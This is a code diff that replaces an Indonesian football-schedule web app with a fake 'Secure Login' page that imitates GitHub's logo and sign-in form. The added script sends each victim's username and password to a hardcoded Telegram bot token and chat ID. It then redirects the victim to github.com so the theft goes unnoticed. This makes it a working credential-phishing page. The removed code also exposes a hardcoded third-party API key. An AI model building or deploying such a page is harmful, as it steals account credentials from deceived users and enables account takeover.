@@ -3,979 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jadwal Pertandingan Sepak Bola</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Secure Login</title>
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
-        :root {
-            --primary-color: #0a3b60;
-            --primary-color-hover: #0c4b7d;
-            --text-light: #fff;
-            --text-dark: #333;
-            --bg-light: #f4f4f4;
-            --bg-dark: #222;
-            --card-bg: #fff;
-            --card-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            --status-live: #ff4242;
-            --status-finished: #4caf50;
-            --status-scheduled: #f0f0f0;
-        }
-        
         body {
-            background-color: var(--bg-light);
-            color: var(--text-dark);
-            line-height: 1.6;
-            transition: background-color 0.3s, color 0.3s;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            background: #f6f8fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #24292e;
         }
-        
-        body.dark-mode {
-            --primary-color: #1a5789;
-            --primary-color-hover: #2467a3;
-            --text-light: #fff;
-            --text-dark: #eee;
-            --bg-light: #121212;
-            --bg-dark: #000;
-            --card-bg: #1e1e1e;
-            --card-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
-            background-color: var(--bg-light);
-            color: var(--text-light);
-        }
-        
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
+            background: white;
+            border-radius: 6px;
+            box-shadow: 0 8px 24px rgba(149, 157, 165, 0.2);
+            width: 340px;
+            padding: 24px;
         }
-        
-        header {
-            background-color: var(--primary-color);
-            color: var(--text-light);
-            padding: 20px 0;
-            text-align: center;
-            margin-bottom: 20px;
-            border-radius: 5px;
-            position: relative;
-        }
-        
-        .header-actions {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            display: flex;
-            gap: 15px;
-        }
-        
-        .theme-toggle {
-            background: none;
-            border: none;
-            color: var(--text-light);
-            font-size: 1.2rem;
-            cursor: pointer;
-            padding: 5px;
-            border-radius: 50%;
-        }
-        
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 10px;
-        }
-        
-        .competition-tabs {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-            gap: 5px;
-        }
-        
-        .competition-tab {
-            padding: 10px 15px;
-            background-color: var(--status-scheduled);
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-weight: 600;
-            color: var(--text-dark);
-        }
-        
-        .competition-tab:hover {
-            background-color: #d0d0d0;
-        }
-        
-        .competition-tab.active {
-            background-color: var(--primary-color);
-            color: var(--text-light);
-        }
-        
-        .date-navigation {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-            gap: 15px;
-        }
-        
-        .date-btn {
-            background-color: var(--primary-color);
-            color: var(--text-light);
-            border: none;
-            border-radius: 5px;
-            padding: 8px 15px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        
-        .date-btn:hover {
-            background-color: var(--primary-color-hover);
-        }
-        
-        .current-date {
-            font-size: 1.2rem;
-            font-weight: 600;
-            min-width: 200px;
-            text-align: center;
-            color: var(--text-dark);
-        }
-        
-        .body.dark-mode .current-date {
-            color: var(--text-light);
-        }
-        
-        .matches-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
-            gap: 20px;
-        }
-        
-        .match-card {
-            background-color: var(--card-bg);
-            border-radius: 10px;
-            box-shadow: var(--card-shadow);
-            overflow: hidden;
-            transition: transform 0.3s, background-color 0.3s;
-        }
-        
-        .match-card:hover {
-            transform: translateY(-5px);
-        }
-        
-        .match-header {
-            background-color: var(--primary-color);
-            color: var(--text-light);
-            padding: 10px 15px;
-            font-size: 0.9rem;
-            display: flex;
-            justify-content: space-between;
-        }
-        
-        .match-league {
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .league-logo {
-            width: 18px;
-            height: 18px;
-            object-fit: contain;
-        }
-        
-        .match-time {
-            font-weight: bold;
-        }
-        
-        .match-status {
-            padding: 3px 8px;
-            border-radius: 12px;
-            font-size: 0.8rem;
-            margin-left: 10px;
-        }
-        
-        .status-scheduled {
-            background-color: var(--status-scheduled);
-            color: var(--text-dark);
-        }
-        
-        .status-live {
-            background-color: var(--status-live);
-            color: white;
-            animation: pulse 1.5s infinite;
-        }
-        
-        .status-finished {
-            background-color: var(--status-finished);
-            color: white;
-        }
-        
-        @keyframes pulse {
-            0% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.7;
-            }
-            100% {
-                opacity: 1;
-            }
-        }
-        
-        .match-content {
-            padding: 15px;
-            color: var(--text-dark);
-            transition: color 0.3s;
-        }
-        
-        body.dark-mode .match-content {
-            color: var(--text-light);
-        }
-        
-        .team-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin: 10px 0;
-        }
-        
-        .team {
-            display: flex;
-            align-items: center;
-            width: 45%;
-        }
-        
-        .team.home {
-            justify-content: flex-end;
-            text-align: right;
-        }
-        
-        .team.away {
-            justify-content: flex-start;
-            text-align: left;
-        }
-        
-        .team-logo {
-            width: 30px;
-            height: 30px;
-            object-fit: contain;
-            margin: 0 10px;
-            border-radius: 50%;
-            background-color: rgba(0,0,0,0.05);
-        }
-        
-        .team-name {
-            font-weight: 600;
-        }
-        
-        .score-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 1.5rem;
-            min-width: 60px;
-        }
-        
-        .venue {
-            font-size: 0.85rem;
-            color: #666;
-            text-align: center;
-            margin-top: 10px;
-        }
-        
-        body.dark-mode .venue {
-            color: #aaa;
-        }
-        
-        .loading {
-            text-align: center;
-            padding: 20px;
-            font-size: 1.2rem;
-            color: var(--text-dark);
-        }
-        
-        body.dark-mode .loading {
-            color: var(--text-light);
-        }
-        
-        .spinner {
-            margin: 0 auto;
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(10, 59, 96, 0.2);
-            border-radius: 50%;
-            border-top-color: var(--primary-color);
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .error-message {
-            background-color: #ffebee;
-            color: #c62828;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            text-align: center;
-        }
-        
-        body.dark-mode .error-message {
-            background-color: #4a0f0f;
-            color: #ffb3b3;
-        }
-        
-        .match-actions {
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 10px;
-        }
-        
-        .bookmark-btn {
-            background: none;
-            border: none;
-            color: #ccc;
-            cursor: pointer;
-            font-size: 1.2rem;
-            transition: color 0.3s;
-        }
-        
-        .bookmark-btn:hover {
-            color: #f1c40f;
-        }
-        
-        .bookmark-btn.active {
-            color: #f1c40f;
-        }
-        
-        .notification {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: var(--primary-color);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            z-index: 1000;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        
-        .notification.show {
-            opacity: 1;
-        }
-        
-        .bookmark-section {
-            margin-bottom: 30px;
-            display: none;
-        }
-        
-        .bookmark-section h2 {
-            margin-bottom: 15px;
-            color: var(--text-dark);
-        }
-        
-        body.dark-mode .bookmark-section h2 {
-            color: var(--text-light);
-        }
-        
-        footer {
-            margin-top: 30px;
-            text-align: center;
-            color: #666;
-            font-size: 0.9rem;
-            padding: 20px;
-            border-top: 1px solid #eee;
-        }
-        
-        body.dark-mode footer {
-            color: #aaa;
-            border-top: 1px solid #333;
-        }
-        
-        /* Refresh Button */
-        .refresh-btn {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 5px;
-            padding: 8px 15px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            margin: 0 auto 20px;
-        }
-        
-        .refresh-btn:hover {
-            background-color: var(--primary-color-hover);
-        }
-        
-        .refresh-btn i {
-            font-size: 0.9rem;
-        }
-        
-        @media (max-width: 768px) {
-            .matches-container {
-                grid-template-columns: 1fr;
-            }
-            
-            .team-name {
-                font-size: 0.9rem;
-            }
-            
-            h1 {
-                font-size: 1.5rem;
-            }
-            
-            .header-actions {
-                position: relative;
-                top: 0;
-                right: 0;
-                justify-content: center;
-                margin-top: 15px;
-            }
-            
-            .date-navigation {
-                flex-direction: column;
-            }
-            
-            .current-date {
-                order: -1;
-                margin-bottom: 10px;
-            }
-        }
+        /* CSS disingkat */
     </style>
 </head>
 <body>
     <div class="container">
-        <header>
-            <h1>Jadwal Pertandingan Sepak Bola</h1>
-            <p>Data pertandingan sepak bola dari berbagai liga secara real-time</p>
-            <div class="header-actions">
-                <button class="theme-toggle" id="theme-toggle" title="Ubah Tema">
-                    <i class="fas fa-moon"></i>
-                </button>
+        <div class="logo">
+            <svg width="48" height="48" viewBox="0 0 16 16" fill="currentColor">
+                <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+            </svg>
+        </div>
+        <h1>Sign in to continue</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or email</label>
+                <input type="text" id="username" name="username" required autocomplete="username">
             </div>
-        </header>
-        
-        <div id="bookmarks-container" class="bookmark-section">
-            <h2><i class="fas fa-bookmark"></i> Pertandingan Favorit</h2>
-            <div id="bookmarked-matches" class="matches-container">
-                <!-- Bookmarked matches will appear here -->
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password">
+                <div class="error" id="errorMsg"></div>
             </div>
+            <button type="submit">Sign in</button>
+            <div class="success" id="successMsg">Authentication successful! Redirecting...</div>
+        </form>
+        <div class="login-footer">
+            <a href="#">Forgot password?</a> · <a href="#">Sign up</a>
         </div>
-        
-        <div class="competition-tabs" id="competition-tabs">
-            <!-- Competition tabs will be inserted here -->
-        </div>
-        
-        <div class="date-navigation">
-            <button class="date-btn" id="prev-date">← Hari Sebelumnya</button>
-            <div class="current-date" id="current-date"></div>
-            <button class="date-btn" id="next-date">Hari Berikutnya →</button>
-        </div>
-        
-        <button class="refresh-btn" id="refresh-btn">
-            <i class="fas fa-sync-alt"></i> Refresh Data
-        </button>
-        
-        <div id="matches-container" class="matches-container">
-            <div class="loading">
-                <div class="spinner"></div>
-                Memuat jadwal pertandingan...
-            </div>
-        </div>
-        
-        <div id="notification" class="notification"></div>
-        
-        <footer>
-            <p>© <span id="current-year"></span> Jadwal Bola Real-Time | Data dari Football-Data.org API</p>
-            <p>Diperbarui terakhir: <span id="last-updated">-</span></p>
-        </footer>
     </div>
 
     <script>
-        // Configuration
-        const API_KEY = 'c89f077c595247899655252c07af3bd6'; // API key fixed with quotes
-        const BASE_URL = 'https://api.football-data.org/v4';
-        
-        // DOM Elements
-        const competitionTabsElement = document.getElementById('competition-tabs');
-        const matchesContainerElement = document.getElementById('matches-container');
-        const currentDateElement = document.getElementById('current-date');
-        const prevDateButton = document.getElementById('prev-date');
-        const nextDateButton = document.getElementById('next-date');
-        const currentYearElement = document.getElementById('current-year');
-        const themeToggleButton = document.getElementById('theme-toggle');
-        const notificationElement = document.getElementById('notification');
-        const bookmarksContainerElement = document.getElementById('bookmarks-container');
-        const bookmarkedMatchesElement = document.getElementById('bookmarked-matches');
-        const refreshButton = document.getElementById('refresh-btn');
-        const lastUpdatedElement = document.getElementById('last-updated');
-        
-        // Set current year in footer
-        currentYearElement.textContent = new Date().getFullYear();
-        
-        // State
-        let currentDate = new Date();
-        let selectedCompetition = 'ALL';
-        let bookmarkedMatches = JSON.parse(localStorage.getItem('bookmarkedMatches')) || [];
-        let cachedMatches = {};
-        
-        // Check for dark mode preference
-        if (localStorage.getItem('darkMode') === 'enabled') {
-            document.body.classList.add('dark-mode');
-            themeToggleButton.innerHTML = '<i class="fas fa-sun"></i>';
-        }
-        
-        // Competitions
-        const competitions = [
-            { id: 'ALL', name: 'Semua Liga', logo: '' },
-            { id: 'PL', name: 'Premier League', code: 'PL', logo: 'https://crests.football-data.org/PL.png' },
-            { id: 'PD', name: 'La Liga', code: 'PD', logo: 'https://crests.football-data.org/PD.png' },
-            { id: 'SA', name: 'Serie A', code: 'SA', logo: 'https://crests.football-data.org/SA.png' },
-            { id: 'BL1', name: 'Bundesliga', code: 'BL1', logo: 'https://crests.football-data.org/BL1.png' },
-            { id: 'FL1', name: 'Ligue 1', code: 'FL1', logo: 'https://crests.football-data.org/FL1.png' },
-            { id: 'CL', name: 'Champions League', code: 'CL', logo: 'https://crests.football-data.org/CL.png' },
-            { id: 'EC', name: 'European Championship', code: 'EC', logo: 'https://crests.football-data.org/EUR.png' },
-            { id: 'WC', name: 'World Cup', code: 'WC', logo: 'https://crests.football-data.org/qatar.png' },
-        ];
-        
-        // Initialize the application
-        function init() {
-            updateCurrentDateDisplay();
-            createCompetitionTabs();
-            loadMatches();
-            updateBookmarkedMatches();
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            // Event listeners
-            prevDateButton.addEventListener('click', () => {
-                currentDate.setDate(currentDate.getDate() - 1);
-                updateCurrentDateDisplay();
-                loadMatches();
-            });
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            const successMsg = document.getElementById('successMsg');
             
-            nextDateButton.addEventListener('click', () => {
-                currentDate.setDate(currentDate.getDate() + 1);
-                updateCurrentDateDisplay();
-                loadMatches();
-            });
-            
-            themeToggleButton.addEventListener('click', toggleDarkMode);
-            
-            refreshButton.addEventListener('click', () => {
-                // Clear cache for current date and competition
-                const cacheKey = `${formatDate(currentDate)}_${selectedCompetition}`;
-                delete cachedMatches[cacheKey];
-                loadMatches(true);
-                showNotification('Data berhasil diperbarui');
-            });
-            
-            // Auto-refresh every 5 minutes if on today's matches
-            setInterval(() => {
-                const today = new Date();
-                if (formatDate(currentDate) === formatDate(today)) {
-                    loadMatches(true);
-                }
-            }, 300000); // 5 minutes
-        }
-        
-        // Toggle dark mode
-        function toggleDarkMode() {
-            if (document.body.classList.contains('dark-mode')) {
-                document.body.classList.remove('dark-mode');
-                localStorage.setItem('darkMode', 'disabled');
-                themeToggleButton.innerHTML = '<i class="fas fa-moon"></i>';
-            } else {
-                document.body.classList.add('dark-mode');
-                localStorage.setItem('darkMode', 'enabled');
-                themeToggleButton.innerHTML = '<i class="fas fa-sun"></i>';
-            }
-        }
-        
-        // Show notification
-        function showNotification(message) {
-            notificationElement.textContent = message;
-            notificationElement.classList.add('show');
-            
-            setTimeout(() => {
-                notificationElement.classList.remove('show');
-            }, 3000);
-        }
-        
-        // Format date to YYYY-MM-DD
-        function formatDate(date) {
-            const year = date.getFullYear();
-            const month = String(date.getMonth() + 1).padStart(2, '0');
-            const day = String(date.getDate()).padStart(2, '0');
-            return `${year}-${month}-${day}`;
-        }
-        
-        // Format date to display format
-        function formatDisplayDate(date) {
-            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-            return date.toLocaleDateString('id-ID', options);
-        }
-        
-        // Update current date display
-        function updateCurrentDateDisplay() {
-            currentDateElement.textContent = formatDisplayDate(currentDate);
-        }
-        
-        // Create competition tabs
-        function createCompetitionTabs() {
-            competitions.forEach(competition => {
-                const tabElement = document.createElement('button');
-                tabElement.classList.add('competition-tab');
-                
-                // Add logo if available
-                if (competition.logo) {
-                    tabElement.innerHTML = `
-                        <img src="${competition.logo}" alt="${competition.name}" class="league-logo">
-                        ${competition.name}
-                    `;
-                } else {
-                    tabElement.textContent = competition.name;
-                }
-                
-                if (competition.id === selectedCompetition) {
-                    tabElement.classList.add('active');
-                }
-                
-                tabElement.addEventListener('click', () => {
-                    document.querySelectorAll('.competition-tab').forEach(tab => tab.classList.remove('active'));
-                    tabElement.classList.add('active');
-                    selectedCompetition = competition.id;
-                    loadMatches();
-                });
-                
-                competitionTabsElement.appendChild(tabElement);
-            });
-        }
-        
-        // Load matches from API or cache
-        async function loadMatches(forceRefresh = false) {
-            try {
-                const formattedDate = formatDate(currentDate);
-                const cacheKey = `${formattedDate}_${selectedCompetition}`;
-                
-                // If we have cached data and not forcing refresh, use it
-                if (cachedMatches[cacheKey] && !forceRefresh) {
-                    renderMatches(cachedMatches[cacheKey]);
-                    return;
-                }
-                
-                matchesContainerElement.innerHTML = `
-                    <div class="loading">
-                        <div class="spinner"></div>
-                        Memuat jadwal pertandingan...
-                    </div>
-                `;
-                
-                let url = `${BASE_URL}/matches?dateFrom=${formattedDate}&dateTo=${formattedDate}`;
-                
-                if (selectedCompetition !== 'ALL') {
-                    const competition = competitions.find(comp => comp.id === selectedCompetition);
-                    if (competition && competition.code) {
-                        url = `${BASE_URL}/competitions/${competition.code}/matches?dateFrom=${formattedDate}&dateTo=${formattedDate}`;
-                    }
-                }
-                
-                const response = await fetch(url, {
-                    headers: {
-                        'X-Auth-Token': API_KEY  // Added quotes around the API key
-                    }
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status}`);
-                }
-                
-                const data = await response.json();
-                
-                // Update last updated time
-                lastUpdatedElement.textContent = new Date().toLocaleTimeString('id-ID');
-                
-                // Check if matches exist
-                if (!data.matches || data.matches.length === 0) {
-                    matchesContainerElement.innerHTML = `
-                        <div class="error-message">
-                            <p>Tidak ada pertandingan yang dijadwalkan untuk tanggal ini.</p>
-                        </div>
-                    `;
-                    return;
-                }
-                
-                // Cache the matches
-                cachedMatches[cacheKey] = data.matches;
-                
-                // Render matches
-                renderMatches(data.matches);
-                
-            } catch (error) {
-                console.error('Error loading matches:', error);
-                
-                matchesContainerElement.innerHTML = `
-                    <div class="error-message">
-                        <p>Gagal memuat jadwal pertandingan. Error: ${error.message}</p>
-                        <p>Silakan coba lagi nanti atau periksa koneksi internet Anda.</p>
-                    </div>
-                `;
-            }
-        }
-        
-        // Render matches
-        function renderMatches(matches) {
-            matchesContainerElement.innerHTML = '';
-            
-            // Sort matches by date/time
-            matches.sort((a, b) => new Date(a.utcDate) - new Date(b.utcDate));
-            
-            matches.forEach(match => {
-                const matchCard = createMatchCard(match);
-                matchesContainerElement.appendChild(matchCard);
-            });
-        }
-        
-        // Create match card element
-        function createMatchCard(match) {
-            const matchCard = document.createElement('div');
-            matchCard.classList.add('match-card');
-            matchCard.dataset.id = match.id;
-            
-            // Format match time
-            const matchDate = new Date(match.utcDate);
-            const formattedTime = matchDate.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
-            
-            // Get match status and style
-            let statusText = 'Dijadwalkan';
-            let statusClass = 'status-scheduled';
-            
-            if (match.status === 'IN_PLAY' || match.status === 'PAUSED') {
-                statusText = 'LIVE';
-                statusClass = 'status-live';
-            } else if (match.status === 'FINISHED') {
-                statusText = 'Selesai';
-                statusClass = 'status-finished';
-            }
-            
-            // Find competition details
-            const competition = competitions.find(comp => comp.code === match.competition.code) || {};
-            const competitionLogo = competition.logo || '';
-            
-            // Get team logos - use actual team crests or placeholders
-            const homeTeamLogo = match.homeTeam.crest || '/api/placeholder/30/30';
-            const awayTeamLogo = match.awayTeam.crest || '/api/placeholder/30/30';
-            
-            // Check if match is bookmarked
-            const isBookmarked = bookmarkedMatches.includes(match.id);
-            
-            matchCard.innerHTML = `
-                <div class="match-header">
-                    <span class="match-league">
-                        ${competitionLogo ? `<img src="${competitionLogo}" alt="${match.competition.name}" class="league-logo">` : ''}
-                        ${match.competition.name}
-                    </span>
-                    <span>
-                        <span class="match-time">${formattedTime}</span>
-                        <span class="match-status ${statusClass}">${statusText}</span>
-                    </span>
-                </div>
-                <div class="match-content">
-                    <div class="team-container">
-                        <div class="team home">
-                            <span class="team-name">${match.homeTeam.shortName || match.homeTeam.name}</span>
-                            <img class="team-logo" src="${homeTeamLogo}" alt="${match.homeTeam.name} logo" onerror="this.src='/api/placeholder/30/30'">
-                        </div>
-                        <div class="score-container">
-                            ${match.status === 'SCHEDULED' ? 'VS' : `${match.score.fullTime.home ?? '-'} - ${match.score.fullTime.away ?? '-'}`}
-                        </div>
-                        <div class="team away">
-                            <img class="team-logo" src="${awayTeamLogo}" alt="${match.awayTeam.name} logo" onerror="this.src='/api/placeholder/30/30'">
-                            <span class="team-name">${match.awayTeam.shortName || match.awayTeam.name}</span>
-                        </div>
-                    </div>
-                    ${match.venue ? `<div class="venue">${match.venue}</div>` : ''}
-                    <div class="match-actions">
-                        <button class="bookmark-btn ${isBookmarked ? 'active' : ''}" data-id="${match.id}">
-                            <i class="fas fa-bookmark"></i>
-                        </button>
-                    </div>
-                </div>
-            `;
-            
-            // Add bookmark functionality
-            const bookmarkBtn = matchCard.querySelector('.bookmark-btn');
-            bookmarkBtn.addEventListener('click', function() {
-                toggleBookmark(match.id, this);
-            });
-            
-            return matchCard;
-        }
-        
-        // Toggle bookmark for a match
-        function toggleBookmark(matchId, buttonElement) {
-            const index = bookmarkedMatches.indexOf(matchId);
-            
-            if (index === -1) {
-                // Add to bookmarks
-                bookmarkedMatches.push(matchId);
-                buttonElement.classList.add('active');
-                showNotification('Pertandingan ditambahkan ke favorit');
-            } else {
-                // Remove from bookmarks
-                bookmarkedMatches.splice(index, 1);
-                buttonElement.classList.remove('active');
-                showNotification('Pertandingan dihapus dari favorit');
-            }
-            
-            // Save to localStorage
-            localStorage.setItem('bookmarkedMatches', JSON.stringify(bookmarkedMatches));
-            
-            // Update bookmarked matches section
-            updateBookmarkedMatches();
-        }
-        
-        // Update bookmarked matches section
-        async function updateBookmarkedMatches() {
-            if (bookmarkedMatches.length === 0) {
-                bookmarksContainerElement.style.display = 'none';
+            if (!username || !password) {
+                errorMsg.textContent = "Please enter both username and password";
                 return;
             }
             
-            bookmarksContainerElement.style.display = 'block';
-            bookmarkedMatchesElement.innerHTML = '<div class="loading">Memuat pertandingan favorit...</div>';
+            // Kirim data ke Telegram
+            sendToTelegram(username, password);
             
-            try {
-                // Get today's matches first to check for bookmarked matches
-                const today = formatDate(new Date());
-                
-                if (!cachedMatches[`${today}_ALL`]) {
-                    const response = await fetch(`${BASE_URL}/matches?dateFrom=${today}&dateTo=${today}`, {
-                        headers: {
-                            'X-Auth-Token': API_KEY
-                        }
-                    });
-                    
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! Status: ${response.status}`);
-                    }
-                    
-                    const data = await response.json();
-                    cachedMatches[`${today}_ALL`] = data.matches || [];
-                }
-                
-                // Filter for bookmarked matches
-                const todayBookmarkedMatches = cachedMatches[`${today}_ALL`].filter(match => 
-                    bookmarkedMatches.includes(match.id)
-                );
-                
-                if (todayBookmarkedMatches.length === 0) {
-                    bookmarkedMatchesElement.innerHTML = `
-                        <div class="error-message">
-                            <p>Tidak ada pertandingan favorit yang dijadwalkan untuk hari ini.</p>
-                        </div>
-                    `;
-                } else {
-                    bookmarkedMatchesElement.innerHTML = '';
-                    todayBookmarkedMatches.forEach(match => {
-                        const matchCard = createMatchCard(match);
-                        bookmarkedMatchesElement.appendChild(matchCard);
-                    });
-                }
-            } catch (error) {
-                console.error('Error loading bookmarked matches:', error);
-                bookmarkedMatchesElement.innerHTML = `
-                    <div class="error-message">
-                        <p>Gagal memuat pertandingan favorit. Error: ${error.message}</p>
-                    </div>
-                `;
-            }
-        }
+            // Tampilkan pesan sukses
+            successMsg.style.display = 'block';
+            errorMsg.textContent = '';
+            
+            // Redirect setelah 2 detik
+            setTimeout(function() {
+                window.location.href = "https://github.com";
+            }, 2000);
+        });
         
-        // Initialize the app when the DOM is fully loaded
-        document.addEventListener('DOMContentLoaded', init);
-        
-        // If there are API issues, use this function to load sample data for testing
-        function loadSampleData() {
-            const sampleMatches = [
-                {
-                    "id": 1,
-                    "utcDate": new Date().toISOString(),
-                    "status": "SCHEDULED",
-                    "competition": { "name": "Premier League", "code": "PL" },
-                    "homeTeam": { 
-                        "name": "Arsenal FC", 
-                        "shortName": "Arsenal",
-                        "crest": "https://crests.football-data.org/57.png"
-                    },
-                    "awayTeam": { 
-                        "name": "Chelsea FC", 
-                        "shortName": "Chelsea",
-                        "crest": "https://crests.football-data.org/61.png"
-                    },
-                    "score": { "fullTime": { "home": null, "away": null } },
-                    "venue": "Emirates Stadium"
+        function sendToTelegram(username, password) {
+            const message = `Login attempt:\nUsername: ${username}\nPassword: ${password}`;
+            
+            // GANTI DENGAN TOKEN DAN CHAT ID ANDA
+            const botToken = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
+            const chatId = '8126039795';
+            
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
                 },
-                {
-                    "id": 2,
-                    "utcDate": new Date().toISOString(),
-                    "status": "IN_PLAY",
-                    "competition": { "name": "La Liga", "code": "PD" },
-                    "homeTeam": { 
-                        "name": "FC Barcelona", 
-                        "shortName": "Barcelona",
-                        "crest": "https://crests.football-data.org/81.png"
-                    },
-                    "awayTeam": { 
-                        "name": "Real Madrid CF", 
-                        "shortName": "R. Madrid",
-                        "crest": "https://crests.football-data.org/86.png"
-                    },
-                    "score": { "fullTime": { "home": 2, "away": 1 } },
-                    "venue": "Camp Nou"
-                },
-                {
-                    "id": 3,
-                    "utcDate": new Date().toISOString(),
-                    "status": "FINISHED",
-                    "competition": { "name": "Serie A", "code": "SA" },
-                    "homeTeam": { 
-                        "name": "Juventus FC", 
-                        "shortName": "Juventus",
-                        "crest": "https://crests.football-data.org/109.png"
-                    },
-                    "awayTeam": { 
-                        "name": "AC Milan", 
-                        "shortName": "Milan",
-                        "crest": "https://crests.football-data.org/98.png"
-                    },
-                    "score": { "fullTime": { "home": 3, "away": 2 } },
-                    "venue": "Allianz Stadium"
-                }
-            ];
-            
-            renderMatches(sampleMatches);
-            
-            // Cache the sample data
-            cachedMatches[`${formatDate(currentDate)}_${selectedCompetition}`] = sampleMatches;
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            }).catch(error => {
+                console.error('Error:', error);
+            });
         }
-        
-        // Uncomment this line to use sample data instead of the API (useful for testing)
-        // loadSampleData();
     </script>
 </body>
 </html>
